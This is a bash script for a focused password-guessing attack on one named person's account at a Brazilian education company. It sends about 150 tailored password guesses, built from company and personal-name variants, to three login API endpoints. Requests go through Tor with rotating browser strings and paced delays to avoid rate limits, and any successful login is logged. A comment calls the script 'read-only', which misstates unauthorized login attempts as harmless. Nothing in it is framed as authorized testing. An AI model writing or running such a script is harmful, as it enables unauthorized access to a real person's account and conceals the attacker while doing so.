#!/bin/bash
# Focused credential stuffing for luiz.fernando@degraucultural.com.br
# Read-only (login attempts). Rate-limited ~5/min via Tor.
cd /home/ubuntu/degraucultural.com.br/webapp
curlp() {
  local UA=("Mozilla/5.0 X11 Chrome/120" "Mozilla/5.0 Mac Safari/17" "Mozilla/5.0 Win Firefox/121")
  timeout 40 proxychains4 -q curl -s -A "${UA[$((RANDOM % 3))]}" --max-time 25 "$@"
}
U="luiz.fernando@degraucultural.com.br"
LOG=/home/ubuntu/degraucultural.com.br/webapp/credstuff_luiz.log
: > "$LOG"
USERURL=https://seducar-api-dashboard.onrender.com/v1/jwt/user/login
CUSTURL=https://seducar-api-dashboard.onrender.com/v1/jwt/customer/login
HMLURL=https://api-qf9p.onrender.com/v1/jwt/user/login
HDR=(-H "Content-Type: application/json" -H "domain: degraucultural.com.br")

WORDS="123456 password 12345678 1234 12345 abc123 111111 1234567 admin master 654321 superman 123123 666666 888888 159753 000000 121212 131313 123321 987654321 1234567890 112233 qwe123 159357 0123456789 246810 135790 degrau degraucultural seducar editorafernando luizfernando luiz Luiz fernando Fernando Fernandinho fernando123 luiz123 deg2024 degrau2024 degrau2023 degrau2025 Degrau2024 Degrau2023 Seducar2024 Seducar2023 seducar2024 Seducar@2024 Degrau@2024 Degrau@2023 Seducar@2023 administrador Administrador@123 Mudar@123 Trocar@123 alterar123 senha123 Senha@123 qwerty qwerty123 Aa123456 Aa@123456 P@ssw0rd Passw0rd Pass@123 Welcome1 Welcome@123 degrau12345 Degrau12345 Seducar12345 1q2w3e4r 1q2w3e Zaq12wsx Qaz1wsx2edc Brasil123 Brasil@123 concursos2024 Concursos@123 CNU2024 cnu2024 123Mudar mudar123 Mudar123 alterar123 senha senha123 degrau@123 seducar@123 luiz@123 Luiz@123 fernando@123 Fernando@123 lf@123 LF@123 lf123 Lu123 Fernando@1234 Luiz@2024 Fernando@2024 Luiz@2023 admin@123 root toor guest convidado professor aluno aluno123 Professor@123 prof123 professor2024 unidadevirtual Unidade@123 virtual123 2024@2024 2023@2023 01/01/1990 degrau2019 degrau2020 degrau2021 degrau2022 @123 @12345 123@123 12@34 1234@1234 degrau!@# D@2024 s3duc4r d3gr4u 5educ4r d3gr4u2024 s3duc4r2024 Lf@2024 lf@2024 lf@2023 deg@123 DEG@123 D3gr4u@123 12345aA Aa12345678 145690 asdf1234 zxcv1234 degrau#2024"

i=0
for p in $WORDS; do
  for URL in $USERURL $CUSTURL $HMLURL; do
    R=$(curlp -X POST $URL "${HDR[@]}" -d "{\"email\":\"$U\",\"password\":\"$p\"}")
    if ! echo "$R" | grep -qiE "Invalid credentials|User not found|Teacher not found"; then
      echo "[!!!HIT!!!] URL=$URL pwd=$p -> $R" | tee -a "$LOG"
    fi
    i=$((i+1))
    # rate-limit: ~5/min per endpoint pair -> sleep every 5 attempts
    if [ $((i % 5)) -eq 0 ]; then sleep 14; fi
  done
done
echo "DONE total=$i" >> "$LOG"
